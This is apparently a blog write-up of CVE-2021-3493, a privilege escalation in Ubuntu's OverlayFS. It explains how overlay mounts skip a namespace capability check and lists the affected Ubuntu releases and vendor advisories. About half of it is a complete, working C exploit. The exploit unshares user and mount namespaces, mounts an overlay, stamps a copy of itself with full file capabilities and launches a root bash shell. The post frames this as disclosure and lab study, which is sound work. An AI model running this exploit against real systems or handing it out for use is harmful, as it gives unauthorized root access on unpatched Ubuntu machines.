---
layout: default
title : muzec - OverlayFS - Local Privilege Escalation - CVE-2021-3493
---

The overlayfs implementation in the linux kernel did not properly validate with respect to user namespaces the setting of file capabilities on files in an underlying file system. Due to the combination of unprivileged user namespaces along with a patch carried in the Ubuntu kernel to allow unprivileged overlay mounts, an attacker could use this to gain elevated privileges. 

*You can read more here:-* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493

### Vulnerability Summary

An Ubuntu specific issue in the overlayfs file system in the Linux kernel where it did not properly validate the application of file system capabilities with respect to user namespaces. A local attacker could use this to gain elevated privileges, due to a patch carried in Ubuntu to allow unprivileged overlayfs mounts.

### CVE

CVE-2021-3493

### Affected Versions

Ubuntu 20.10
Ubuntu 20.04 LTS
Ubuntu 18.04 LTS
Ubuntu 16.04 LTS
Ubuntu 14.04 ESM

### Vulnerability Analysis

Linux supports `file capabilities` stored in extended file attributes that work similarly to setuid-bit, but can be more fine-grained. A simplified procedure for setting file capabilities in pseudo-code looks like this:

```
setxattr(...):
    if cap_convert_nscap(...) is not OK:
        then fail
    vfs_setxattr(...)
```
    
The important call is cap_convert_nscap, which checks permissions with respect to namespaces.

If we set the file capabilities from our own namespace and on our own mount, there is no problem and we have permission to do so. The problem is that when OverlayFS forwards this operation to the underlying file system, it only calls `vfs_setxattr` and skips checks in `cap_convert_nscap`.

This allows to set arbitrary capabilities on files in outer namespace/mount, where they will also be applied during execution.

In Linux 5.11 the call to `cap_convert_nscap` was moved into `vfs_setxattr`, so it is no more vulnerable.

*You can read more here:-* https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/

### Proof Of Concept (POC)

![image](https://user-images.githubusercontent.com/69868171/116479704-14835980-a84e-11eb-8bd3-eb850faf62da.png)

![image](https://user-images.githubusercontent.com/69868171/116479809-42689e00-a84e-11eb-9f26-d8ac914359b9.png)

![image](https://user-images.githubusercontent.com/69868171/116479905-6c21c500-a84e-11eb-8930-0832a5c450b1.png)

*Room Using In Testing:-* https://tryhackme.com/room/overlayfs

### Exploit Code Below;

```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mount.h>

//#include <attr/xattr.h>
//#include <sys/xattr.h>
int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);


#define DIR_BASE    "./ovlcap"
#define DIR_WORK    DIR_BASE "/work"
#define DIR_LOWER   DIR_BASE "/lower"
#define DIR_UPPER   DIR_BASE "/upper"
#define DIR_MERGE   DIR_BASE "/merge"
#define BIN_MERGE   DIR_MERGE "/magic"
#define BIN_UPPER   DIR_UPPER "/magic"


static void xmkdir(const char *path, mode_t mode)
{
    if (mkdir(path, mode) == -1 && errno != EEXIST)
        err(1, "mkdir %s", path);
}

static void xwritefile(const char *path, const char *data)
{
    int fd = open(path, O_WRONLY);
    if (fd == -1)
        err(1, "open %s", path);
    ssize_t len = (ssize_t) strlen(data);
    if (write(fd, data, len) != len)
        err(1, "write %s", path);
    close(fd);
}

static void xcopyfile(const char *src, const char *dst, mode_t mode)
{
    int fi, fo;

    if ((fi = open(src, O_RDONLY)) == -1)
        err(1, "open %s", src);
    if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)
        err(1, "open %s", dst);

    char buf[4096];
    ssize_t rd, wr;

    for (;;) {
        rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {
            break;
        } else if (rd == -1) {
            if (errno == EINTR)
                continue;
            err(1, "read %s", src);
        }

        char *p = buf;
        while (rd > 0) {
            wr = write(fo, p, rd);
            if (wr == -1) {
                if (errno == EINTR)
                    continue;
                err(1, "write %s", dst);
            }
            p += wr;
            rd -= wr;
        }
    }

    close(fi);
    close(fo);
}

static int exploit()
{
    char buf[4096];

    sprintf(buf, "rm -rf '%s/'", DIR_BASE);
    system(buf);

    xmkdir(DIR_BASE, 0777);
    xmkdir(DIR_WORK,  0777);
    xmkdir(DIR_LOWER, 0777);
    xmkdir(DIR_UPPER, 0777);
    xmkdir(DIR_MERGE, 0777);

    uid_t uid = getuid();
    gid_t gid = getgid();

    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
        err(1, "unshare");

    xwritefile("/proc/self/setgroups", "deny");

    sprintf(buf, "0 %d 1", uid);
    xwritefile("/proc/self/uid_map", buf);

    sprintf(buf, "0 %d 1", gid);
    xwritefile("/proc/self/gid_map", buf);

    sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
    if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
        err(1, "mount %s", DIR_MERGE);

    // all+ep
    char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";

    xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
    if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
        err(1, "setxattr %s", BIN_MERGE);

    return 0;
}

int main(int argc, char *argv[])
{
    if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {
        setuid(0);
        setgid(0);
        execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
        err(1, "execl /bin/bash");
    }

    pid_t child = fork();
    if (child == -1)
        err(1, "fork");

    if (child == 0) {
        _exit(exploit());
    } else {
        waitpid(child, NULL, 0);
    }

    execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
    err(1, "execl %s", BIN_UPPER);
}
```

### Vendor Response

We published security advisories for this issue today in

https://ubuntu.com/security/notices/USN-4915-1
https://ubuntu.com/security/notices/USN-4916-1
https://ubuntu.com/security/notices/USN-4917-1

as well as making the issue public in our CVE tracker:

https://ubuntu.com/security/CVE-2021-3493

The following is the content of the message was sent to the oss-security list: 

https://www.openwall.com/lists/oss-security/2021/04/16/1

### You Can Read More About The OverlayFS - CVE-2021-3493:-

https://yagrebu.net/unix/rpi-overlay.md

https://wiki.archlinux.org/index.php/Overlay_filesystem

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3493

https://ssd-disclosure.com/ssd-advisory-overlayfs-pe/


Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>


